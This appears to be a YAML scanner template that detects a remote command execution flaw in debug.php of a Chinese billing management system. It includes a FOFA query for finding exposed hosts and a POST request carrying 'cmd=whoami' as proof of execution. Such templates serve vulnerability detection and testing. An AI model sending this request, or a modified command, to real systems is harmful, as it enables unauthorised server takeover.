expression: r0()
id: lanhai-jifei-debug-rce
info:
  author: daffainfo
  description: "\u84DD\u6D77\u5353\u8D8A\u8BA4\u8BC1\u8BA1\u8D39\u7BA1\u7406\u7CFB\
    \u7EDF\u662F\u4E00\u5957\u4EE5\u5B9E\u73B0\u7F51\u7EDC\u8FD0\u8425\u4E3A\u57FA\
    \u7840\uFF0C\u589E\u5F3A\u5168\u5C40\u5B89\u5168\u4E3A\u4E2D\u5FC3\uFF0C\u63D0\
    \u9AD8\u7BA1\u7406\u6548\u7387\u4E3A\u76EE\u7684\u7684\u7F51\u7EDC\u5B89\u5168\
    \u8FD0\u8425\u7BA1\u7406\u7CFB\u7EDF\uFF0C\u63D0\u4F9B\u201C\u9AD8\u5B89\u5168\
    \u3001\u53EF\u8FD0\u8425\u3001\u6613\u7BA1\u7406\u201D\u7684\u8FD0\u8425\u7BA1\
    \u7406\u4F53\u9A8C\u3002\u53E6\u5916\uFF0C\u53CB\u597D\u7684Web\u8BBF\u95EE\u7BA1\
    \u7406\u7684\u65B9\u5F0F\uFF0C\u4E3A\u7528\u6237\u63D0\u4F9B\u66F4\u597D\u7528\
    \u3001\u6613\u7528\u7684\u65B9\u5F0F\uFF0C\u66F4\u8D34\u5FC3\u7684\u4F7F\u7528\
    \u5F62\u5F0F\u3002\u84DD\u6D77\u5353\u8D8A\u8BA4\u8BC1\u8BA1\u8D39\u7BA1\u7406\
    \u7CFB\u7EDF\u5B58\u5728\u547D\u4EE4\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u653B\u51FB\
    \u8005\u53EF\u4EE5\u901A\u8FC7\u6307\u5B9A\u63A5\u53E3\u6267\u884C\u4EFB\u610F\
    \u547D\u4EE4\uFF0C\u83B7\u53D6\u670D\u52A1\u5668\u7BA1\u7406\u6743\u9650\u3002\
    \nfofa-query: title==\"\u84DD\u6D77\u5353\u8D8A\u8BA1\u8D39\u7BA1\u7406\u7CFB\u7EDF\
    \"\n"
  name: "\u84DD\u6D77\u5353\u8D8A \u8BA1\u8D39\u7BA1\u7406\u7CFB\u7EDF debug.php \u8FDC\
    \u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E"
  reference:
  - https://mp.weixin.qq.com/s/gqlfmCYXA9xX5Ku-36ixaQ
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.headers["content-type"].contains("text/html")  &&
      response.body.bcontains(b'toor')
    request:
      body: 'cmd=whoami

        '
      method: POST
      path: /debug.php?_t=0.01693626099009471
